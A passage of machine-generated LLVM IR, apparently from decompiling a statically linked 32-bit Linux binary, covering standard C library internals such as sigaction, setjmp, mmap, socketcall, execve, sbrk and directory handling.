  ret i32 %v0_8063740

; uselistorder directives
  uselistorder i32 %v0_80636f4, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_80636f3, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32)* @do_system, { 1, 2, 0 }
  uselistorder i32 %arg1, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_806373f, { 1, 0 }
  uselistorder label %dec_label_pc_8063728, { 1, 0 }
}

define i32 @_L_lock_30() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @ecx, align 4
  %v0_806374b = call i32 @__lll_lock_wait_private()
  %v0_8063750 = call i32 @function_806336f()
  ret i32 %v0_8063750
}

define i32 @_L_unlock_52() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @eax, align 4
  %v0_806375b = call i32 @__lll_unlock_wake_private()
  %v0_8063760 = call i32 @function_80633b9()
  ret i32 %v0_8063760
}

define i32 @_L_lock_74() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @ecx, align 4
  %v0_806376b = call i32 @__lll_lock_wait_private()
  %v0_8063770 = call i32 @function_80633f7()
  ret i32 %v0_8063770
}

define i32 @_L_unlock_113() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @eax, align 4
  %v0_806377b = call i32 @__lll_unlock_wake_private()
  %v0_8063780 = call i32 @function_8063465()
  ret i32 %v0_8063780
}

define i32 @_L_lock_129() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @ecx, align 4
  %v0_806378b = call i32 @__lll_lock_wait_private()
  %v0_8063790 = call i32 @function_80634a9()
  ret i32 %v0_8063790
}

define i32 @_L_unlock_158() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @eax, align 4
  %v0_806379b = call i32 @__lll_unlock_wake_private()
  %v0_80637a0 = call i32 @function_8063504()
  ret i32 %v0_80637a0
}

define i32 @_L_lock_288() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @ecx, align 4
  %v0_80637ab = call i32 @__lll_lock_wait_private()
  %v0_80637b0 = call i32 @function_806367a()
  ret i32 %v0_80637b0
}

define i32 @_L_unlock_328() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8078300.1662 to i32), i32* @eax, align 4
  %v0_80637bb = call i32 @__lll_unlock_wake_private()
  %v0_80637c0 = call i32 @function_80636e8()
  ret i32 %v0_80637c0
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_80637ce = load i32, i32* @eax, align 4
  %v1_80637ce = sub i32 0, %v0_80637ce
  store i32 %v1_80637ce, i32* inttoptr (i32 -8 to i32*), align 8
  ret i32 -1
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_80637d8:
  %v0_80637dd = load i32, i32* @ebx, align 4
  %v1_80637dd = inttoptr i32 %v0_80637dd to %sigcontext*
  %v2_80637dd = call i32 @sigreturn(%sigcontext* %v1_80637dd)
  %v0_80637e5 = load i32, i32* @ebx, align 4
  %v1_80637e5 = inttoptr i32 %v0_80637e5 to %sigcontext*
  %v2_80637e5 = call i32 @sigreturn(%sigcontext* %v1_80637e5)
  ret i32 %v2_80637e5
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg2 to i32
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_80637ea = load i32, i32* @esi, align 4
  %v1_80637f2 = icmp eq i32* %arg2, null
  br i1 %v1_80637f2, label %dec_label_pc_8063822, label %dec_label_pc_80637f6

dec_label_pc_80637f6:                             ; preds = %entry
  %v2_80637f6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  store i32 %v2_80637f6, i32* %edi.global-to-local, align 4
  %v2_80637fe = load i32, i32* %arg2, align 4
  store i32 %v2_80637fe, i32* %stack_var_-28, align 4
  %v7_80637fe = load i1, i1* @df, align 1
  %v8_80637fe = select i1 %v7_80637fe, i32 -4, i32 4
  %v9_80637fe = add i32 %v8_80637fe, %v2_80637f6
  %v10_80637fe = add i32 %v8_80637fe, %tmp6
  store i32 %v9_80637fe, i32* %edi.global-to-local, align 4
  store i32 %v10_80637fe, i32* %esi.global-to-local, align 4
  %v1_80637ff = inttoptr i32 %v10_80637fe to i32*
  %v2_80637ff = load i32, i32* %v1_80637ff, align 4
  %v4_80637ff = inttoptr i32 %v9_80637fe to i32*
  store i32 %v2_80637ff, i32* %v4_80637ff, align 4
  %v5_80637ff = load i32, i32* %edi.global-to-local, align 4
  %v6_80637ff = load i32, i32* %esi.global-to-local, align 4
  %v9_80637ff = add i32 %v5_80637ff, %v8_80637fe
  %v10_80637ff = add i32 %v6_80637ff, %v8_80637fe
  store i32 %v9_80637ff, i32* %edi.global-to-local, align 4
  store i32 %v10_80637ff, i32* %esi.global-to-local, align 4
  %v1_8063800 = inttoptr i32 %v10_80637ff to i32*
  %v2_8063800 = load i32, i32* %v1_8063800, align 4
  %v4_8063800 = inttoptr i32 %v9_80637ff to i32*
  store i32 %v2_8063800, i32* %v4_8063800, align 4
  %v5_8063800 = load i32, i32* %edi.global-to-local, align 4
  %v6_8063800 = load i32, i32* %esi.global-to-local, align 4
  %v9_8063800 = add i32 %v5_8063800, %v8_80637fe
  %v10_8063800 = add i32 %v6_8063800, %v8_80637fe
  store i32 %v9_8063800, i32* %edi.global-to-local, align 4
  store i32 %v10_8063800, i32* %esi.global-to-local, align 4
  %v1_8063801 = inttoptr i32 %v10_8063800 to i32*
  %v2_8063801 = load i32, i32* %v1_8063801, align 4
  %v4_8063801 = inttoptr i32 %v9_8063800 to i32*
  store i32 %v2_8063801, i32* %v4_8063801, align 4
  %v5_8063801 = load i32, i32* %edi.global-to-local, align 4
  %v6_8063801 = load i32, i32* %esi.global-to-local, align 4
  %v9_8063801 = add i32 %v5_8063801, %v8_80637fe
  %v10_8063801 = add i32 %v6_8063801, %v8_80637fe
  store i32 %v9_8063801, i32* %edi.global-to-local, align 4
  store i32 %v10_8063801, i32* %esi.global-to-local, align 4
  %v1_8063802 = inttoptr i32 %v10_8063801 to i32*
  %v2_8063802 = load i32, i32* %v1_8063802, align 4
  %v4_8063802 = inttoptr i32 %v9_8063801 to i32*
  store i32 %v2_8063802, i32* %v4_8063802, align 4
  %v6_8063802 = load i32, i32* %esi.global-to-local, align 4
  %v10_8063802 = add i32 %v6_8063802, %v8_80637fe
  store i32 %v10_8063802, i32* @esi, align 4
  store i32 %v2_80637f6, i32* %edi.global-to-local, align 4
  %phitmp = bitcast i32* %stack_var_-28 to %sigaction*
  br label %dec_label_pc_8063822

dec_label_pc_8063822:                             ; preds = %entry, %dec_label_pc_80637f6
  %v0_8063828 = phi %sigaction* [ null, %entry ], [ %phitmp, %dec_label_pc_80637f6 ]
  %v5_806382d = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8063828, i32 %arg3, i32 8)
  store i32 %v0_80637ea, i32* @esi, align 4
  ret i32 %v5_806382d

; uselistorder directives
  uselistorder i32 %v2_80637f6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8063822, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp1, i32* %edx.global-to-local, align 4
  %v0_806383e = load i32, i32* @ebx, align 4
  %v2_806383e = inttoptr i32 %tmp1 to i32*
  store i32 %v0_806383e, i32* %v2_806383e, align 4
  %v0_8063840 = load i32, i32* @esi, align 4
  %v1_8063840 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063840 = add i32 %v1_8063840, 4
  %v3_8063840 = inttoptr i32 %v2_8063840 to i32*
  store i32 %v0_8063840, i32* %v3_8063840, align 4
  %v0_8063843 = load i32, i32* @edi, align 4
  %v1_8063843 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063843 = add i32 %v1_8063843, 8
  %v3_8063843 = inttoptr i32 %v2_8063843 to i32*
  store i32 %v0_8063843, i32* %v3_8063843, align 4
  %v2_8063846 = ptrtoint i32* %stack_var_4 to i32
  %v1_806384a = load i32, i32* %edx.global-to-local, align 4
  %v2_806384a = add i32 %v1_806384a, 16
  %v3_806384a = inttoptr i32 %v2_806384a to i32*
  store i32 %v2_8063846, i32* %v3_806384a, align 4
  %v1_8063850 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063850 = add i32 %v1_8063850, 20
  %v3_8063850 = inttoptr i32 %v2_8063850 to i32*
  store i32 %arg1, i32* %v3_8063850, align 4
  %v0_8063853 = load i32, i32* @ebp, align 4
  %v1_8063853 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063853 = add i32 %v1_8063853, 12
  %v3_8063853 = inttoptr i32 %v2_8063853 to i32*
  store i32 %v0_8063853, i32* %v3_8063853, align 4
  %v1_8063856 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063856 = add i32 %v1_8063856, 24
  %v3_8063856 = inttoptr i32 %v2_8063856 to i32*
  store i32 0, i32* %v3_8063856, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_806385c = load i32, i32* @ebx, align 4
  %v2_8063863 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8063863, i32* @ebx, align 4
  %v8_8063867 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_806385c, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8063867, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134625224)
  ret i32 %v8_8063867

; uselistorder directives
  uselistorder i32 %v8_8063867, { 1, 0 }
  uselistorder i32 134625224, { 5, 8, 9, 0, 1, 6, 7, 10, 11, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @ecx, align 4
  %v0_8063880 = load i32, i32* @ebx, align 4
  %v1_8063887 = call i32 @int80_syscall(i32 102)
  store i32 %v0_8063880, i32* @ebx, align 4
  store i32 %v1_8063887, i32* @edx, align 4
  %tmp = icmp ult i32 %v1_8063887, -4095
  br i1 %tmp, label %dec_label_pc_80638a2, label %dec_label_pc_8063895

dec_label_pc_8063895:                             ; preds = %entry
  %v1_806389a = sub i32 0, %v1_8063887
  store i32 %v1_806389a, i32* @edx, align 4
  store i32 %v1_806389a, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80638a2

dec_label_pc_80638a2:                             ; preds = %entry, %dec_label_pc_8063895
  %v0_80638a2 = phi i32 [ %v1_8063887, %entry ], [ -1, %dec_label_pc_8063895 ]
  ret i32 %v0_80638a2

; uselistorder directives
  uselistorder i32 %v1_8063887, { 1, 2, 0, 3 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80638a2, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp6 = inttoptr i32 %arg3 to %sigaction*
  %v7_80638bd = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp6)
  store i32 %v7_80638bd, i32* @edx, align 4
  %tmp = icmp ult i32 %v7_80638bd, -4095
  br i1 %tmp, label %dec_label_pc_80638d7, label %dec_label_pc_80638ca

dec_label_pc_80638ca:                             ; preds = %entry
  %v1_80638cf = sub i32 0, %v7_80638bd
  store i32 %v1_80638cf, i32* @edx, align 4
  store i32 %v1_80638cf, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80638d7

dec_label_pc_80638d7:                             ; preds = %entry, %dec_label_pc_80638ca
  %v0_80638d8 = phi i32 [ %v7_80638bd, %entry ], [ -1, %dec_label_pc_80638ca ]
  ret i32 %v0_80638d8

; uselistorder directives
  uselistorder i32 %v7_80638bd, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80638d7, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %v5_80638f0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80638f0 = insertvalue [1 x i8*] undef, i8* %tmp4, 0
  %v9_80638f0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80638f0, [1 x i8*] %v8_80638f0)
  %tmp = icmp ult i32 %v9_80638f0, -4095
  br i1 %tmp, label %dec_label_pc_806390a, label %dec_label_pc_80638fd

dec_label_pc_80638fd:                             ; preds = %entry
  %v1_8063902 = sub i32 0, %v9_80638f0
  store i32 %v1_8063902, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_806390a

dec_label_pc_806390a:                             ; preds = %entry, %dec_label_pc_80638fd
  %v0_806390a = phi i32 [ %v9_80638f0, %entry ], [ -1, %dec_label_pc_80638fd ]
  ret i32 %v0_806390a

; uselistorder directives
  uselistorder i32 %v9_80638f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806390a, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_8063911 = call i32 @int80_syscall(i32 202)
  ret i32 %v1_8063911
}

define i32 @getgid() local_unnamed_addr {
entry:
  %v1_8063919 = call i32 @int80_syscall(i32 200)
  ret i32 %v1_8063919
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_806391c = load i32, i32* @global_var_80782c8.1657, align 8
  %v1_8063927 = icmp eq i32 %v0_806391c, 0
  %v1_8063929 = icmp eq i1 %v1_8063927, false
  %v4_8063929 = select i1 %v1_8063929, i32 %v0_806391c, i32 4096
  ret i32 %v4_8063929
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_8063935 = call i32 @int80_syscall(i32 199)
  ret i32 %v1_8063935
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8063947 = call i32 @munmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp = icmp ult i32 %v4_8063947, -4095
  br i1 %tmp, label %dec_label_pc_8063962, label %dec_label_pc_8063955

dec_label_pc_8063955:                             ; preds = %entry
  %v1_806395a = sub i32 0, %v4_8063947
  store i32 %v1_806395a, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8063962

dec_label_pc_8063962:                             ; preds = %entry, %dec_label_pc_8063955
  %v0_8063962 = phi i32 [ %v4_8063947, %entry ], [ -1, %dec_label_pc_8063955 ]
  ret i32 %v0_8063962

; uselistorder directives
  uselistorder i32 %v4_8063947, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder label %dec_label_pc_8063962, { 1, 0 }
}

define i32 @__syscall_nanosleep(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8063964 = load i32, i32* @edx, align 4
  %v1_8063964 = inttoptr i32 %v0_8063964 to %timespec*
  %v0_8063966 = load i32, i32* @eax, align 4
  %v0_8063968 = load i32, i32* @ebx, align 4
  store i32 %v0_8063968, i32* %stack_var_-4, align 4
  %v2_8063969 = inttoptr i32 %v0_8063966 to %timespec*
  %v6_8063970 = call i32 @nanosleep(%timespec* %v2_8063969, %timespec* %v1_8063964)
  %tmp = icmp ult i32 %v6_8063970, -4095
  br i1 %tmp, label %dec_label_pc_806398b, label %dec_label_pc_806397e

dec_label_pc_806397e:                             ; preds = %entry
  %v1_8063983 = sub i32 0, %v6_8063970
  store i32 %v1_8063983, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_806398b

dec_label_pc_806398b:                             ; preds = %entry, %dec_label_pc_806397e
  %v0_806398c = phi i32 [ %v6_8063970, %entry ], [ -1, %dec_label_pc_806397e ]
  %v2_806398b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806398b, i32* @ebx, align 4
  ret i32 %v0_806398c

; uselistorder directives
  uselistorder i32 %v6_8063970, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806398b, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_806398d = load i32, i32* @edi, align 4
  %v0_806398e = load i32, i32* @esi, align 4
  %v0_806398f = load i32, i32* @ebx, align 4
  store i32 %v0_806398f, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8063998 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806399e = icmp eq i32 %v0_8063998, 0
  %v1_80639a0 = icmp eq i1 %v1_806399e, false
  br i1 %v1_80639a0, label %entry.dec_label_pc_80639ab_crit_edge, label %dec_label_pc_80639a2

entry.dec_label_pc_80639ab_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80639ab

dec_label_pc_80639a2:                             ; preds = %entry
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v0_806398f, i32* @ebx, align 4
  store i32 %v0_806398d, i32* %edi.global-to-local, align 4
  %v3_80639a9 = call i32 @__syscall_nanosleep(i32 %v0_806398f, i32 %v0_806398e, i32 %v0_806398d)
  %v0_80639ab.pre = load i32, i32* %stack_var_-12, align 4
  %v3_80639ab.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_80639ab

dec_label_pc_80639ab:                             ; preds = %entry.dec_label_pc_80639ab_crit_edge, %dec_label_pc_80639a2
  %v3_80639ab = phi i32 [ %tmp6, %entry.dec_label_pc_80639ab_crit_edge ], [ %v3_80639ab.pre, %dec_label_pc_80639a2 ]
  %v0_80639ab = phi i32 [ %v0_806398f, %entry.dec_label_pc_80639ab_crit_edge ], [ %v0_80639ab.pre, %dec_label_pc_80639a2 ]
  %v4_80639ab = call i32 @__libc_enable_asynccancel(i32 %v0_80639ab, i32 %v0_806398e, i32 %v0_806398d, i32 %v3_80639ab)
  %v0_80639b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80639b0, i32* @edx, align 4
  store i32 %v4_80639ab, i32* @esi, align 4
  %v0_80639b4 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80639b4, i32* @eax, align 4
  %v0_80639b6 = load i32, i32* %stack_var_-12, align 4
  %v3_80639b6 = call i32 @__syscall_nanosleep(i32 %v0_80639b6, i32 %v0_806398e, i32 %v0_806398d)
  store i32 %v3_80639b6, i32* @ebx, align 4
  %v0_80639bd = load i32, i32* @esi, align 4
  store i32 %v0_80639bd, i32* @eax, align 4
  %v1_80639bf = call i32 @__libc_disable_asynccancel(i32 %v0_80639b6)
  %v0_80639c4 = load i32, i32* @ebx, align 4
  %v2_80639c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80639c6, i32* @ebx, align 4
  store i32 %v0_806398e, i32* @esi, align 4
  store i32 %v0_806398d, i32* @edi, align 4
  ret i32 %v0_80639c4

; uselistorder directives
  uselistorder i32 %v0_806398e, { 1, 2, 0, 3 }
  uselistorder i32 %v0_806398d, { 1, 2, 0, 4, 3 }
  uselistorder i32* %stack_var_-12, { 2, 1, 0, 3 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80639ab, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80639cd = load i32, i32* @ebx, align 4
  %v0_80639d1 = load i32, i32* @global_var_8078840.1669, align 64
  %v1_80639d1 = icmp eq i32 %v0_80639d1, 0
  %v1_80639dc = icmp eq i1 %v1_80639d1, false
  br i1 %v1_80639dc, label %dec_label_pc_80639ef, label %dec_label_pc_80639de

dec_label_pc_80639de:                             ; preds = %entry
  %v2_80639e3 = call i32 @__GI_brk(i32* null)
  %v2_80639eb = icmp slt i32 %v2_80639e3, 0
  br i1 %v2_80639eb, label %dec_label_pc_8063a11, label %dec_label_pc_80639de.dec_label_pc_80639ef_crit_edge

dec_label_pc_80639de.dec_label_pc_80639ef_crit_edge: ; preds = %dec_label_pc_80639de
  %v0_80639f1.pre = load i32, i32* @global_var_8078840.1669, align 64
  br label %dec_label_pc_80639ef

dec_label_pc_80639ef:                             ; preds = %dec_label_pc_80639de.dec_label_pc_80639ef_crit_edge, %entry
  %v0_80639ff = phi i32 [ %v0_80639f1.pre, %dec_label_pc_80639de.dec_label_pc_80639ef_crit_edge ], [ %v0_80639d1, %entry ]
  %v1_80639ef = icmp eq i32 %arg1, 0
  %v1_80639f6 = icmp eq i1 %v1_80639ef, false
  br i1 %v1_80639f6, label %dec_label_pc_80639fc, label %dec_label_pc_80639f8

dec_label_pc_80639f8:                             ; preds = %dec_label_pc_80639ef
  br label %dec_label_pc_8063a14

dec_label_pc_80639fc:                             ; preds = %dec_label_pc_80639ef
  store i32 %v0_80639ff, i32* @ebx, align 4
  %v2_8063a01 = add i32 %v0_80639ff, %arg1
  %v1_8063a05 = inttoptr i32 %v2_8063a01 to i32*
  %v2_8063a05 = call i32 @__GI_brk(i32* %v1_8063a05)
  %v2_8063a0d = icmp slt i32 %v2_8063a05, 0
  %v1_8063a0f = icmp eq i1 %v2_8063a0d, false
  br i1 %v1_8063a0f, label %dec_label_pc_80639fc.dec_label_pc_8063a14_crit_edge, label %dec_label_pc_8063a11

dec_label_pc_80639fc.dec_label_pc_8063a14_crit_edge: ; preds = %dec_label_pc_80639fc
  %v0_8063a15.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8063a14

dec_label_pc_8063a11:                             ; preds = %dec_label_pc_80639fc, %dec_label_pc_80639de
  br label %dec_label_pc_8063a14

dec_label_pc_8063a14:                             ; preds = %dec_label_pc_80639fc.dec_label_pc_8063a14_crit_edge, %dec_label_pc_80639f8, %dec_label_pc_8063a11
  %v0_8063a15 = phi i32 [ %v0_8063a15.pre, %dec_label_pc_80639fc.dec_label_pc_8063a14_crit_edge ], [ %v0_80639ff, %dec_label_pc_80639f8 ], [ -1, %dec_label_pc_8063a11 ]
  %v2_8063a14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063a14, i32* @edx, align 4
  store i32 %v0_80639cd, i32* @ebx, align 4
  ret i32 %v0_8063a15

; uselistorder directives
  uselistorder i32 %v0_80639ff, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8063a14, { 2, 0, 1 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8063a1d = load i32, i32* @esi, align 4
  store i32 %tmp3, i32* @edi, align 4
  %v2_8063a26 = load i32, i32* %arg1, align 4
  %v12_8063a26 = icmp eq i32 %v2_8063a26, -1
  %v1_8063a29 = icmp eq i1 %v12_8063a26, false
  br i1 %v1_8063a29, label %dec_label_pc_8063a39, label %dec_label_pc_8063a2b

dec_label_pc_8063a2b:                             ; preds = %entry
  br label %dec_label_pc_8063a9c

dec_label_pc_8063a39:                             ; preds = %entry
  %v12_8063a1f = ptrtoint i32* %stack_var_-28 to i32
  %v1_8063a3a = add i32 %tmp3, 24
  store i32 %v12_8063a1f, i32* @esi, align 4
  %v4_8063a48 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134623208, i32 %v1_8063a3a)
  %v1_8063a50 = call i32 @__pthread_return_0(i32 %v1_8063a3a)
  %v0_8063a55 = load i32, i32* @edi, align 4
  %v1_8063a55 = inttoptr i32 %v0_8063a55 to i32*
  %v2_8063a55 = load i32, i32* %v1_8063a55, align 4
  store i32 %v2_8063a55, i32* @ebx, align 4
  store i32 -1, i32* %v1_8063a55, align 4
  %v3_8063a62 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8063a68 = load i32, i32* @edi, align 4
  %v1_8063a68 = add i32 %v0_8063a68, 12
  %v2_8063a68 = inttoptr i32 %v1_8063a68 to i32*
  %v3_8063a68 = load i32, i32* %v2_8063a68, align 4
  %v1_8063a6b = call i32 @free(i32 %v3_8063a68)
  %v0_8063a70 = load i32, i32* @edi, align 4
  %v1_8063a73 = call i32 @free(i32 %v0_8063a70)
  %v0_8063a78 = load i32, i32* @ebx, align 4
  %v1_8063a81 = call i32 @close(i32 %v0_8063a78)
  store i32 %v0_8063a78, i32* @ecx, align 4
  %tmp = icmp ult i32 %v1_8063a81, -4095
  br i1 %tmp, label %dec_label_pc_8063a9f, label %dec_label_pc_8063a92

dec_label_pc_8063a92:                             ; preds = %dec_label_pc_8063a39
  %v1_8063a97 = sub i32 0, %v1_8063a81
  br label %dec_label_pc_8063a9c

dec_label_pc_8063a9c:                             ; preds = %dec_label_pc_8063a2b, %dec_label_pc_8063a92
  %storemerge = phi i32 [ %v1_8063a97, %dec_label_pc_8063a92 ], [ 9, %dec_label_pc_8063a2b ]
  store i32 %storemerge, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8063a9f

dec_label_pc_8063a9f:                             ; preds = %dec_label_pc_8063a39, %dec_label_pc_8063a9c
  %v0_8063aa5 = phi i32 [ %v1_8063a81, %dec_label_pc_8063a39 ], [ -1, %dec_label_pc_8063a9c ]
  store i32 %v0_8063a1d, i32* @esi, align 4
  ret i32 %v0_8063aa5

; uselistorder directives
  uselistorder i32 %v1_8063a81, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8063a9f, { 1, 0 }
  uselistorder label %dec_label_pc_8063a9c, { 1, 0 }
}

define i32 @fd_to_DIR() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063aa8 = load i32, i32* @edi, align 4
  %v0_8063aa9 = load i32, i32* @eax, align 4
  store i32 %v0_8063aa9, i32* @edi, align 4
  %v0_8063aab = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_8063aae = load i32, i32* @ebx, align 4
  store i32 %v0_8063aae, i32* %stack_var_-12, align 4
  %v0_8063aaf = load i32, i32* @edx, align 4
  store i32 %v0_8063aaf, i32* @ebx, align 4
  %v1_8063ab6 = call i32 @malloc(i32 48)
  store i32 %v1_8063ab6, i32* %eax.global-to-local, align 4
  %v1_8063abe = icmp eq i32 %v1_8063ab6, 0
  br i1 %v1_8063abe, label %dec_label_pc_8063b31, label %dec_label_pc_8063ac2

dec_label_pc_8063ac2:                             ; preds = %entry
  %v0_8063ac2 = load i32, i32* @edi, align 4
  %v2_8063ac2 = inttoptr i32 %v1_8063ab6 to i32*
  store i32 %v0_8063ac2, i32* %v2_8063ac2, align 4
  %v0_8063ac4 = load i32, i32* @ebx, align 4
  store i32 %v1_8063ab6, i32* @esi, align 4
  %v1_8063acc = add i32 %v1_8063ab6, 16
  %v2_8063acc = inttoptr i32 %v1_8063acc to i32*
  store i32 0, i32* %v2_8063acc, align 4
  %v1_8063ad3 = add i32 %v1_8063ab6, 8
  %v2_8063ad3 = inttoptr i32 %v1_8063ad3 to i32*
  store i32 0, i32* %v2_8063ad3, align 4
  %v1_8063ada = add i32 %v1_8063ab6, 4
  %v2_8063ada = inttoptr i32 %v1_8063ada to i32*
  store i32 0, i32* %v2_8063ada, align 4
  %tmp = icmp ult i32 %v0_8063ac4, 512
  %v4_8063ae6 = load i32, i32* @ebx, align 4
  %v5_8063ae6 = select i1 %tmp, i32 512, i32 %v4_8063ae6
  store i32 %v5_8063ae6, i32* %eax.global-to-local, align 4
  %v1_8063ae9 = load i32, i32* @esi, align 4
  %v2_8063ae9 = add i32 %v1_8063ae9, 20
  %v3_8063ae9 = inttoptr i32 %v2_8063ae9 to i32*
  store i32 %v5_8063ae6, i32* %v3_8063ae9, align 4
  %v0_8063aec = load i32, i32* @edx, align 4
  %v0_8063aee = load i32, i32* %eax.global-to-local, align 4
  %v5_8063af1 = call i32 @calloc(i64 1, i32 %v0_8063aee, i32 %v0_8063aec, i32 %v0_8063aec)
  store i32 %v5_8063af1, i32* %eax.global-to-local, align 4
  %v1_8063af9 = icmp eq i32 %v5_8063af1, 0
  %v1_8063afb = load i32, i32* @esi, align 4
  %v2_8063afb = add i32 %v1_8063afb, 12
  %v3_8063afb = inttoptr i32 %v2_8063afb to i32*
